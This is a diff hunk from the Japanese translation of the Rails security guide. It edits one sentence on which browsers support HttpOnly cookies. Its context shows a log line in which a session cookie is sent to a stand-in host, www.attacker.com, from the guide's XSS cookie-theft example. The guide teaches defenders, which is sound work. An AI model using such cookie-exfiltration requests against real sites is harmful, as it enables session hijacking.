@@ -700,7 +700,7 @@ www.attacker.com サイト上のログファイルには以下のように記録
 GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2
 ```
 
-この攻撃をある程度軽減するためには[httpOnly](http://dev.rubyonrails.org/ticket/8895)フラグをcookieに追加します。これにより、JavaScriptを使用してdocument.cookieを読み出せなくなります。HTTP only cookieはIE v6から使用できます。SP1, Firefox v2.0.0.5 and Opera 9.5. Safariはまだこのフラグを検討中であり、このオプションは無視されます。ただしWebTVやMac版IE 5.5などの古いブラウザでは、ページ上での読み込みに失敗します。なお、[Ajaxを使用するとcookieが表示可能になる](http://ha.ckers.org/blog/20070719/firefox-implements-httponly-and-is-vulnerable-to-xmlhttprequest/)ことにもご注意ください。
+この攻撃をある程度軽減するためには[httpOnly](http://dev.rubyonrails.org/ticket/8895)フラグをcookieに追加します。これにより、JavaScriptを使用してdocument.cookieを読み出せなくなります。HTTP only cookieはIE v6.SP1、Firefox v2.0.0.5、Opera 9.5.から使用できます。 Safariはまだこのフラグを検討中であり、このオプションは無視されます。ただしWebTVやMac版IE 5.5などの古いブラウザでは、ページ上での読み込みに失敗します。なお、[Ajaxを使用するとcookieが表示可能になる](http://ha.ckers.org/blog/20070719/firefox-implements-httponly-and-is-vulnerable-to-xmlhttprequest/)ことにもご注意ください。
 
 ##### Webページの汚損
 
